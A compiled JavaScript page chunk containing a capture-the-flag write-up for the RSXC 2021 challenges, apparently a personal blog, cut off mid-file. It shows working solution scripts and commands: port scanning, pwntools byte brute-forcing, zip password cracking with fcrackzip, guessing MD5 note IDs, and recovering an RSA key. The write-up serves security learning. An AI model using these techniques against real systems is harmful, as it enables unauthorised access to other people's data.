import{S as xy,i as Uy,s as Ry,C as pg,w as Ny,x as Wy,y as Sy,z as My,A as S6,f as Iy,t as Oy,B as Fy,V as M6,l as e,r as c,a as u,m as t,n as o,u as i,h as a,c as k,p as r,H as Oe,b as l,J as n,E as zy}from"../../chunks/index-a24079f7.js";import{L as Cy}from"../../chunks/layout-c3125ff1.js";function Dy(Fe){let h,C,D,O,d,F,js,Ps,ze,yf,Pc,ws,Hs,Vf,vp,xf,Uf,Rf,_p,Nf,Hc,As,Ce,Wf,Ac,De,Sf,Xc,Xs,O6=`<code class="language-shell">juki@izone:~$ nmap rsxc.no -p30000-31000 -Pn
Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-12-15 <span class="token number">23</span>:27 CET
Nmap scan report <span class="token keyword">for</span> rsxc.no <span class="token punctuation">(</span><span class="token number">134.209</span>.137.128<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">1000</span> closed ports
PORT      STATE SERVICE
<span class="token number">30780</span>/tcp <span class="token function">open</span>  unknown

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.76</span> seconds
juki@izone:~$ <span class="token function">nc</span> rsxc.no <span class="token number">30780</span>
RSXC<span class="token punctuation">&#123;</span>Congrats<span class="token operator">!</span>You_found_the_secret_port_I_was_trying_to_hide<span class="token operator">!</span><span class="token punctuation">&#125;</span></code>`,Gc,Gs,Mf,wp,If,qc,qs,Ye,Of,Bc,Bs,Ze,Ff,$c,Es,Ep,zf,Cf,Tp,Df,Qc,$s,Je,Yf,Lc,Y,Zf,yp,Jf,jf,Vp,Pf,Hf,Kc,Qs,F6=`<code class="language-shell">juki@izone:~$ <span class="token function">nc</span> rsxc.no <span class="token number">20002</span>
aaaa
That is not the byte I want<span class="token operator">!</span></code>`,si,je,Af,ai,Ls,z6=`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#context.log_level = "debug"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rsxc.no"</span><span class="token punctuation">,</span> <span class="token number">20002</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b"RSXC&#123;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span> <span class="token comment"># flag at ascii code 212</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">break</span></code>`,ni,Ks,Xf,xp,Gf,ei,sa,Pe,qf,ti,aa,He,Bf,oi,Ae,Xe,$f,$,Qf,pi,na,Ge,Lf,li,ea,C6=`<code class="language-undefined">// 03-challenge.txt
ZlhTWk5KQTV6d3JuVzNpQnFyeGl5cXNkSEdBelZWVkdOMVVXRkQzVG5XQjhSSlBxU3VVQjNvVGZlTjJmdll0ZnVDazRyRzk0SzRYSzUxdzlwZktTY1pqMTdBeXNKa0ZWZVpGdXV6Snh1YmF0OWRORWJBbVNGU0RBeDhvdkZGTjh5VG44WnhKUjU2THZ6NFU1dVloeTExaEVEZzRlSGlTS29EWnJvNTVWTng3NUN4RWJwRnRnOUdDZVR2dEtCVldKajVWOFRwOFIzUXI4WmhRVEhON3BGQXM4NWdoMXNzNUxXcXplUW5kTVdnenliaHgxRFU0RlczNXBTU2drdkVtYjc2dnE2TDlzeERYQXpTcXoxNzFOMkZmZ1M4aGdmZFY4VmpnQWlIc1I3ZjU2ZjdBc2h2cFZwdmZmOVd0VUZnSjJFRVBXeENCeFVHOXRQVFpjYTlFUXczaFJUd1M0RlZlTE1TUHNCdXpKWTdxU043cEs5bTlKNWs3cTRNaWI2Ym1Lem9uYXk1bUVNeXJtYVNVNFVnWm9VeG9KdkRrVkhS</code>`,ci,ta,Kf,Q,sh,ii,Ts,ah,Up,nh,eh,ri,oa,qe,th,ui,pa,Be,oh,ki,$e,Qe,ph,L,lh,fi,la,Le,ch,hi,ys,ih,Rp,rh,uh,di,ca,D6=`<code class="language-python"><span class="token comment"># Turn each char of flag into decimals for easier calculation (xoring)</span>
flag <span class="token operator">=</span> <span class="token string">"0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># Find key</span>
key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> key<span class="token operator">*</span><span class="token number">20</span> <span class="token comment"># Repeat the key many times</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span class="token comment"># XOR</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span>y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,mi,ia,kh,Np,fh,bi,ra,Ke,hh,gi,ua,st,dh,vi,at,nt,mh,K,bh,_i,ka,et,gh,wi,tt,vh,Ei,fa,Y6='<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span></code>',Ti,Vs,_h,Wp,wh,Eh,yi,ha,Z6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"flag"</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
<span class="token number">4</span>*<span class="token comment">#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
<span class="token number">4</span>*<span class="token comment">#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
:simen<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
jPRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
<span class="token number">4</span>*PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
<span class="token number">4</span>*PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
x<span class="token operator">&amp;</span>:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
STOR ./flag.zip
	STOR ./flag.zip
	STOR ./flag.zip
flag.txtUT
flag.txtUT
flag.txtUT
flag.txtUT</code>`,Vi,ot,Th,xi,da,J6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ binwalk -e 05-challenge.pcap

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span class="token number">0</span>             0x0             Libpcap capture file, little-endian, version <span class="token number">2.4</span>, Linux <span class="token string">"cooked"</span>, snaplen: <span class="token number">262144</span>
<span class="token number">44141</span>         0xAC6D          Zip archive data, encrypted at least v2.0 to extract, compressed size: <span class="token number">67</span>, uncompressed size: <span class="token number">56</span>, name: flag.txt
<span class="token number">44368</span>         0xAD50          End of Zip archive, footer length: <span class="token number">22</span>
<span class="token number">44474</span>         0xADBA          Zip archive data, encrypted at least v2.0 to extract, compressed size: <span class="token number">67</span>, uncompressed size: <span class="token number">56</span>, name: flag.txt
<span class="token number">44701</span>         0xAE9D          End of Zip archive, footer length: <span class="token number">22</span>

juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">cd</span> _05-challenge.pcap.extracted/
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">ls</span>
AC6D.zip  ADBA.zip  flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">unzip</span> -v ADBA.zip
Archive:  ADBA.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
      <span class="token number">56</span>  Defl:N       <span class="token number">55</span>   <span class="token number">2</span>% <span class="token number">2021</span>-11-10 <span class="token number">16</span>:31 79fcc455  flag.txt
--------          -------  ---                            -------
      <span class="token number">56</span>               <span class="token number">55</span>   <span class="token number">2</span>%                            <span class="token number">1</span> <span class="token function">file</span>
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ fcrackzip -u --length <span class="token number">10</span> -p <span class="token number">9954000000</span> --charset <span class="token number">1</span> ADBA.zip -v
found <span class="token function">file</span> <span class="token string">'flag.txt'</span>, <span class="token punctuation">(</span>size cp/uc     <span class="token number">67</span>/    <span class="token number">56</span>, flags <span class="token number">9</span>, chk 3be9<span class="token punctuation">)</span>


PASSWORD FOUND<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>: pw <span class="token operator">==</span> <span class="token number">9954359864</span>
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">unzip</span> ADBA.zip
Archive:  ADBA.zip
<span class="token punctuation">[</span>ADBA.zip<span class="token punctuation">]</span> flag.txt password:
replace flag.txt? <span class="token punctuation">[</span>y<span class="token punctuation">]</span>es, <span class="token punctuation">[</span>n<span class="token punctuation">]</span>o, <span class="token punctuation">[</span>A<span class="token punctuation">]</span>ll, <span class="token punctuation">[</span>N<span class="token punctuation">]</span>one, <span class="token punctuation">[</span>r<span class="token punctuation">]</span>ename: y
  inflating: flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">cat</span> flag.txt
RSXC<span class="token punctuation">&#123;</span>Good_job_analyzing_the_pcap_did_you_see_the_hint?<span class="token punctuation">&#125;</span></code>`,Ui,ma,yh,Sp,Vh,Ri,ba,pt,xh,Ni,ga,lt,Uh,Wi,ct,it,Rh,ss,Nh,Si,va,rt,Wh,Mi,_a,Mp,lg,Ii,wa,Sh,Ip,Mh,Oi,Ea,ut,Ih,Fi,Ta,kt,Oh,zi,ft,ht,Fh,as,zh,Ci,ya,dt,Ch,Di,mt,Dh,Yi,Va,j6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ exiftool 07-challenge.jpg
ExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">11.16</span>
File Name                       <span class="token builtin class-name">:</span> 07-challenge.jpg
Directory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>
File Size                       <span class="token builtin class-name">:</span> <span class="token number">9.0</span> kB
File Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2021</span>:11:25 <span class="token number">22</span>:43:28+01:00
File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2021</span>:12:16 <span class="token number">12</span>:45:32+01:00
File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2021</span>:12:16 <span class="token number">12</span>:45:22+01:00
File Permissions                <span class="token builtin class-name">:</span> rw-r--r--
File Type                       <span class="token builtin class-name">:</span> JPEG
File Type Extension             <span class="token builtin class-name">:</span> jpg
MIME Type                       <span class="token builtin class-name">:</span> image/jpeg
JFIF Version                    <span class="token builtin class-name">:</span> <span class="token number">1.01</span>
Comment                         <span class="token builtin class-name">:</span> CREATOR: gd-jpeg v1.0 <span class="token punctuation">(</span>using IJG JPEG v80<span class="token punctuation">)</span>, quality <span class="token operator">=</span> <span class="token number">75</span>.
Exif Byte Order                 <span class="token builtin class-name">:</span> Big-endian <span class="token punctuation">(</span>Motorola, MM<span class="token punctuation">)</span>
X Resolution                    <span class="token builtin class-name">:</span> <span class="token number">96</span>
Y Resolution                    <span class="token builtin class-name">:</span> <span class="token number">96</span>
Resolution Unit                 <span class="token builtin class-name">:</span> inches
Y Cb Cr Positioning             <span class="token builtin class-name">:</span> Centered
Thumbnail Offset                <span class="token builtin class-name">:</span> <span class="token number">199</span>
Thumbnail Length                <span class="token builtin class-name">:</span> <span class="token number">2265</span>
Image Width                     <span class="token builtin class-name">:</span> <span class="token number">798</span>
Image Height                    <span class="token builtin class-name">:</span> <span class="token number">69</span>
Encoding Process                <span class="token builtin class-name">:</span> Baseline DCT, Huffman coding
Bits Per Sample                 <span class="token builtin class-name">:</span> <span class="token number">8</span>
Color Components                <span class="token builtin class-name">:</span> <span class="token number">1</span>
Image Size                      <span class="token builtin class-name">:</span> 798x69
Megapixels                      <span class="token builtin class-name">:</span> <span class="token number">0.055</span>
Thumbnail Image                 <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>Binary data <span class="token number">2265</span> bytes, use -b option to extract<span class="token punctuation">)</span></code>`,Zi,xa,Op,cg,Ji,Ua,Yh,Fp,Zh,ji,Ra,bt,Jh,Pi,Na,gt,jh,Hi,vt,_t,Ph,ns,Hh,Ai,Wa,wt,Ah,Xi,V,Xh,zp,Gh,qh,Cp,Bh,$h,Dp,Qh,Lh,Yp,Kh,sd,Gi,Sa,ad,Zp,nd,qi,Ma,Et,ed,Bi,Ia,Tt,td,$i,yt,Vt,od,es,pd,Qi,Oa,xt,ld,Li,Fa,Jp,ig,Ki,Ut,cd,sr,za,P6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> -n note0 <span class="token operator">|</span> md5sum
65b29a77142a5c237d7b21c005b72157  -</code>`,ar,Z,id,ts,rd,ud,jp,kd,fd,nr,Ca,H6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> -n flag <span class="token operator">|</span> md5sum
327a6c4304ad5938eaf0efb6cc3e53dc  -
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20009/notes.php?id<span class="token operator">=</span>327a6c4304ad5938eaf0efb6cc3e53dc <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span>
RSXC<span class="token punctuation">&#123;</span>MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext<span class="token punctuation">&#125;</span></code>`,er,Da,hd,Pp,dd,tr,Ya,Rt,md,or,Za,Nt,bd,pr,Wt,St,gd,os,vd,lr,Ja,Mt,_d,cr,J,wd,Hp,Ed,Td,Ap,yd,Vd,ir,ja,A6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -I rsxc.no:20010/
HTTP/1.1 <span class="token number">200</span> OK
Date: Thu, <span class="token number">16</span> Dec <span class="token number">2021</span> <span class="token number">16</span>:20:12 GMT
Server: Apache/2.4.51 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
X-Powered-By: PHP/7.4.26
Flag: RSXC<span class="token punctuation">&#123;</span>Sometimes_headers_can_tell_you_something_useful<span class="token punctuation">&#125;</span>
Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8</code>`,rr,Pa,xd,Xp,Ud,ur,Ha,It,Rd,kr,Aa,Ot,Nd,fr,Ft,zt,Wd,ps,Sd,hr,Xa,Ct,Md,dr,xs,Id,Gp,Od,Fd,mr,j,zd,qp,Cd,Dd,Bp,Yd,Zd,br,Ga,X6=`<code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA <span class="token comment">#pycryptodome</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> randprime<span class="token punctuation">,</span> nextprime<span class="token punctuation">,</span> invert
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> mpz

<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rsa.out"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        n<span class="token punctuation">,</span>_<span class="token punctuation">,</span>ct <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    ct <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ct<span class="token punctuation">)</span>
    n <span class="token operator">=</span> mpz<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> <span class="token number">65537</span>
    estimate <span class="token operator">=</span> mpz<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    prime <span class="token operator">=</span> estimate
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"r: "</span><span class="token punctuation">,</span>estimate<span class="token punctuation">)</span>
    p <span class="token operator">=</span> mpz<span class="token punctuation">(</span>prime<span class="token punctuation">)</span>
    q <span class="token operator">=</span> mpz<span class="token punctuation">(</span>n <span class="token operator">//</span> p<span class="token punctuation">)</span>
    <span class="token keyword">assert</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q <span class="token operator">==</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p: "</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q: "</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    rsa <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">)</span>
decode<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,gr,qa,Jd,$p,jd,vr,Ba,Dt,Pd,_r,$a,Yt,Hd,wr,Zt,Qp,Ad,Er,Qa,Jt,Xd,Tr,jt,Gd,yr,La,G6=`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode

sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rsxc.no"</span><span class="token punctuation">,</span> <span class="token number">20012</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
    q<span class="token punctuation">,</span>a <span class="token operator">=</span> q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> <span class="token string">"reverse"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">elif</span> <span class="token string">"hex"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"lower"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"base64"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Vr,Ka,qd,Lp,Bd,xr,sn,Pt,$d,Ur,an,Ht,Qd,Rr,At,Xt,Ld,ls,Kd,Nr,nn,Gt,sm,Wr,Us,am,Kp,nm,em,Sr,en,q6=`<code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Todos</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> b64 <span class="token operator">=</span> <span class="token string">'UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0='</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Hide this somewhere, and not just rely on base64: </span><span class="token punctuation">&#123;</span>b64<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>`,Mr,qt,tm,Ir,tn,B6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0</span><span class="token operator">=</span> <span class="token operator">|</span> base64 -d
RSXC<span class="token punctuation">&#123;</span>it_might_be_there_even_if_you_don't_include_it<span class="token operator">!</span><span class="token punctuation">&#125;</span></code>`,Or,on,om,sl,pm,Fr,pn,Bt,lm,zr,ln,$t,cm,Cr,Qt,Lt,im,cs,rm,Dr,cn,Kt,um,Yr,rn,al,rg,Zr,so,km,Jr,un,$6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token assign-left variable">TEMP14</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20014/'</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"PHPSESSID=.*?;"</span><span class="token variable">)</span></span> <span class="token comment"># Get PHPSESSIONID</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> <span class="token string">'http://rsxc.no:20014/'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP14<span class="token variable">)</span></span>"</span> --data-raw <span class="token string">'username=test&amp;password=test'</span> <span class="token comment"># LOGIN</span>
